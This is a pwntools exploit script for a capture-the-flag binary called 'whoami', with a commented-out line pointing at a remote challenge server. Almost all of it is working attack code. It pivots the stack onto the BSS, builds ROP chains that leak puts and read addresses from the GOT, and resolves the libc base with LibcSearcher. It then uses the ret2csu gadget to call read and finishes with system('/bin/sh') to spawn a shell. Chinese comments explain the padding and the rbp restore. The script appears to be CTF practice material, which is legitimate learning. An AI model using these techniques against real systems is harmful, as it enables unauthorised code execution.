from pwn import *
from LibcSearcher import *
# p=remote('61.147.171.105',59404)
p=process('./whoami')
elf=ELF('./whoami')
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')
rl = lambda	a=False		: p.recvline(a)
ru = lambda a=True	: p.recvuntil(a)
rn = lambda x			: p.recvn(x)
sn = lambda x			: p.send(x)
sl = lambda x			: p.sendline(x)
sa = lambda a,b			: p.sendafter(a,b)
sla = lambda a,b		: p.sendlineafter(a,b)
irt = lambda			: p.interactive()
dbg = lambda text=None  : gdb.attach(p, text)
lg = lambda s,addr		: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))


bss_addr=0x601040
buf_addr1=bss_addr+0xa0
buf_addr2=bss_addr+0x90
buf_addr3=bss_addr+0x10
buf_addr4=bss_addr+0x308
main_addr=0x0000000000400771
pop_rbp=0x0000000000400648
pop_rdi=0x0000000000400843
pop_rsi_r15=0x0000000000400841
puts_plt=elf.plt['puts']
read_plt=elf.plt['read']
puts_got=elf.got['puts']
read_got=elf.got['read']
read_0xf0=0x00000000004007BB
leave_ret=0x00000000004007d6
power_rop1=0x000000000040083A
power_rop2=0x0000000000400820

def getpower(avg1,avg2,avg3,got):
    payload=p64(power_rop1)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)
    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8
    return payload

ru(b'Input name:\n')

payload1=b'a'*0x20+p64(buf_addr1)+p64(leave_ret)##bss+0xc0
sn(payload1)

ru(b'Else?\n')
payload2=b'b'*0xa0+p64(buf_addr2)
payload2+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(read_0xf0)
sn(payload2)

puts_addr=u64(p.recv().strip().ljust(8,b'\x00'))
# print(p.recv())
print("puts:",hex(puts_addr))
libc=LibcSearcher('puts',puts_addr)

pause()


payload9=b'b'*0x90+p64(buf_addr3)
payload9+=p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(read_0xf0)
sn(payload9)
read_addr=u64(p.recv().strip().ljust(8,b'\x00'))
print("read:",hex(read_addr))
# libc.add_condition('read',read_addr)
libc.select_libc(0)
libcbase=puts_addr-libc.dump('puts')
# libcbase=puts_addr-libc.symbols['puts']
print('libcbase',hex(libcbase))
system_addr=libcbase+libc.dump('system')
# system_addr=libcbase+libc.symbols['system']
print("system:",hex(system_addr))

payload3=b'w'*0x10+p64(buf_addr4)
payload3+=getpower(0,buf_addr4,0xe0,read_got)
payload3+=p64(pop_rbp)+p64(buf_addr4)+p64(leave_ret)#此处再次给rbp赋值是因为使用万能gadget时把rbp冲掉了
# payload3+=p64(pop_rdi)+p64(0)
# payload3+=p64(pop_rsi_r15)+p64(buf_addr4)+p64(0)+p64(read_plt)+p64(leave_ret)
# payload3=payload3.ljust(240,b's')
sn(payload3)

payload4 = p64(bss_addr+0x400)#此处无所谓了，反正不再转移了
payload4 += p64(pop_rdi)
payload4 += p64(bss_addr+0x308+0x20)
payload4 += p64(system_addr)
payload4 += b'/bin/sh\x00'
sl(payload4)

pause()
p.interactive()
